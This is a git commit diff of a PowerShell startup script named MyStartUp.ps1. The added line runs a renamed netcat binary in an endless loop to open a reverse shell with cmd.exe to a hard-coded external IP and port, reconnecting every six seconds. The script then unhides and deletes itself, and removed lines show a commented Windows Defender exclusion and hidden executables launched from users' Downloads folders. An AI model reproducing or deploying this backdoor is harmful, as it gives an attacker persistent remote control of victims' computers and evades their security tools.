fd25134ee8ac4b1c987a5295ec5430cd09db6070
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2023-11-27 17:31:18 -0300

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -1,19 +1,9 @@
-#$exclusionPath = "C:\Users\ana\Downloads"
 
-#Add-MpPreference -ExclusionPath $exclusionPath
-
-
-C:\Users\Public\RNM.exe -nv 193.161.193.99 40877 -e cmd.exe
-
-#C:\Users\ana\Downloads\ana123.exe
-#attrib +h C:\Users\seba\downloads\shaxh21.exe
-#C:\Users\seba\downloads\shaxh21.exe
+while ($true){ C:\Users\Public\RNM.exe -nv 193.161.193.99 40877 -e cmd.exe ; Start-Sleep 6 }
 
 
 #taskkill /F /IM Disk-Updating.exe
 #C:\Users\angel\Downloads\Disk-Updating.exe
-taskkill /F /IM lml.exe
-C:\Users\seba\Downloads\lml.exe
 
 attrib -h C:\Users\Public\MyStartUp.ps1
 del C:\Users\Public\MyStartUp.ps1
